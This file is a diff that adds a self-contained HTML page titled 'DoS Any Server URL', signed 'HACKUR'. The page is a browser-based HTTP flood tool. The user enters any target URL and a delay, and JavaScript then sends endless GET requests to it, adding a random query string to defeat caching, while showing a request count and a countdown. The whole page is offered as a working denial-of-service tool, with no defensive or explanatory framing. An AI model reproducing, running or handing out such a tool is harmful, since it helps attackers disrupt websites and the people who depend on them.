@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>DoS Any Server URL</title>
+        <link rel="icon" type="image/x-icon" href="https://www.nicepng.com/png/detail/53-532322_skull-warhammer-skull-vector.png">
+    </head>
+    <body>
+    <center>
+    <form action="javascript:StartHTTPFlood()">
+    <input id="urlInp" type="url" required placeholder="Type URL to start DoS attack" value=><p></p><br><br><input type="number" placeholder="Type the time of delay on each request" id="NumberOfDelay" value="0"><select id="IntervalTime"><option selected>MILLISECONDS</option><option>SECONDS</option></select><p></p><br><button>Start Flood</button><br><p></p><br>
+    <div id="ProgressContainer">
+    <div>Progress until time end:</div><p></p>
+        <progress id="PostDataLimit" max="100"></progress><p><br></p>
+        </div>
+        <div id="FetchCountContainer"></div>
+        <div><b>Response Of Requests:</b></div><p></p>
+        </center>
+        <textarea id="TextResponse" cols="46" rows="20" disabled></textarea><br>
+        <center><p><b>Made by &copy;HACKUR</b></p></center>
+        
+        </form>
+
+    <script>
+    
+        var ProgressContainer = document.querySelector("#ProgressContainer");
+        
+        ProgressContainer.style.display = "none";
+        
+        var AllButtons = document.querySelector("button");
+        var count = 0;
+        var NumberOfDelay = document.getElementById("NumberOfDelay");
+        var IntervalTime = document.getElementById("IntervalTime");
+        var PostDataLimit = document.getElementById("PostDataLimit");
+        
+        var urlInp = document.getElementById("urlInp");
+        var TextResponse = document.getElementById("TextResponse");
+var FetchCount = 0; 
+var IncreasingProgress = 0;      
+var seconds = 100;
+
+AllButtons.addEventListener("click", function(){
+    
+    
+    AllButtons.style.backgroundColor = "white";
+    AllButtons.style.color = "black"
+    
+    setTimeout(function(){
+        
+    AllButtons.style.backgroundColor = "black";
+    AllButtons.style.color = "white";
+        
+    }, 700)
+    
+    
+});
+
+
+        function StartHTTPFlood(){
+        
+        ProgressContainer.style.display = "block";
+        
+if(IntervalTime.value == "SECONDS"){
+    
+    
+    var TimeOfDelay = parseInt(NumberOfDelay.value)*1000;
+    
+}else{
+    
+
+    var TimeOfDelay = parseInt(NumberOfDelay.value)*1;
+
+}
+        
+        setInterval(function(){
+            
+            seconds --
+            
+        }, 1000)
+        
+        setInterval(function(){
+            
+            IncreasingProgress ++
+            
+        }, 1000)
+        
+        setInterval(function(){
+        
+        var url = urlInp.value;
+        
+var fullURL = url + "?q="+Math.random();
+        var FetchCountContainer = document.getElementById("FetchCountContainer");
+var xhr = new XMLHttpRequest();
+xhr.open("GET", fullURL);
+
+xhr.onreadystatechange = function () {
+   if (xhr.readyState === 4) {
+      
+        count = IncreasingProgress;
+        FetchCount += 1;
+        PostDataLimit.value = count;
+            
+            if(count >= 100){
+            
+         document.write("Your free time, has passed out! Reload the code again!");
+           
+            }else{
+                
+                  FetchCountContainer.innerHTML = "<p style='color:white;'>It was launched on "+`<a href="${fullURL}" style="color:orange;">${url}</a>`+", "+FetchCount+" GET requests and "+Math.floor(seconds)+" seconds of time left!</p>" 
+                
+                TextResponse.value = xhr.responseText;
+                
+            }
+            
+        
+   }};
+
+xhr.send();
+
+        
+        
+        
+        }, TimeOfDelay);
+        
+        
+       
+        }
+        
+        
+       
+       
+        
+    </script>
+
+    <style>
+        body{
+    
+    background-image: url('https://www.maketecheasier.com/assets/uploads/2015/05/easy-terminal-cmatrix-ba.png');
+    color:rgb(255, 0, 0);
+}
+
+input{
+    
+    background-color: rgb(88, 88, 88);
+    border-radius: 50px;
+    color: white;
+    outline: 0;
+    border:2px solid rgb(255, 0, 0);
+    width: 60vw;
+    height: 5vh;
+    text-align: center;
+    transition: 1s ease-in-out;
+}
+
+input:hover{
+    
+    transition: 1s ease-in-out;
+    
+}
+
+select{
+    
+    
+    
+    background-color: rgb(88, 88, 88);
+    border-radius: 35px;
+    color: white;
+    outline: 0;
+    border:2px solid rgb(255, 0, 0);
+    width: 30vw;
+    height: 5.5vh;
+    text-align: center;
+    transition: 1s ease-in-out;
+    
+}
+
+button{
+    
+    
+    background-color: rgb(88, 88, 88);
+    border-radius: 35px;
+    color: white;
+    outline: 0;
+    border:2px solid rgb(255, 0, 0);
+    width: 30vw;
+    height: 5.5vh;
+    text-align: center;
+    transition: 0.7s ease-in-out;
+    
+}
+
+
+progress{
+    
+    
+    background-color:rgb(88, 88, 88);
+    color: white;
+    outline: 0;
+    border: 2px solid rgb(255, 0, 0);
+    width: 60vw;
+    height: 4vh;
+    text-align: center;
+    transition: 0.7s ease-in-out;
+    
+}
+
+textarea{
+    
+    border: rgb(255, 0, 0) solid 2px;
+    width: 95vw;
+    height: 45vh;
+    background-color:rgb(88, 88, 88);
+    color: #00ff59;
+    font-size: auto;
+}
+    </style>
+    </body>
+</html>
